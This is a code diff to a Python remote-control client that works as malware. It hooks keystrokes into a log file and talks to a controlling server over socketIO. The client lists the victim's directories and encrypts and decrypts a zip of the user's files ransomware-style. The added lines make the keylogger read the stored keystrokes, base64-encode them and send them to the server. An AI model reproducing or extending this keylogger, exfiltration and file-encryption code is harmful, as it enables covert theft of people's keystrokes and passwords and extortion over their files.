@@ -43,11 +43,6 @@ def logger(q):
 			if event.Ascii == 13:   # (if char is "return")
 			    f.write("\n")       # (new line)
 			f.write(char)           # (write char)
-			x = q.get()
-			x = x+char
-			q.put(x)
-			print x
-
 
 	proc = pyHook.HookManager()      #open pyHook
 	proc.KeyDown = pressed_chars     #set pressed_chars function on KeyDown event
@@ -91,8 +86,10 @@ def client(q):
 			socketIO.emit("dirData", {'syslist': x})
 
 	def keyLogReturn(data):
-		x = q.get()
-		socketIO.emit("keylogData", {"keylogdata": str(x)})
+		file = open("log_file.txt", 'rb')
+		fileread = file.read()
+		encode = base64.encodestring(fileread)
+		socketIO.emit("keylogData", {"keylogdata": encode})
 
 	def encryptStuff(data):
 		key = encryptionExecute()
@@ -102,7 +99,7 @@ def client(q):
 		socketIO.emit("encryptData", {'key': key})
 
 	def decryptStuff(data):
-		decrypt_file(data['key'],"/Users/"+getpass.getuser()+"/"+ getpass.getuser() +".zip")
+		decrypt_file(data['key'],"/Users/"+getpass.getuser()+"/Documents.zip")
 		#decrypt_file(data['key'], "/Users/Hareesh/test.zip.enc")
 	def tts(data):
 		speak(data['text'])
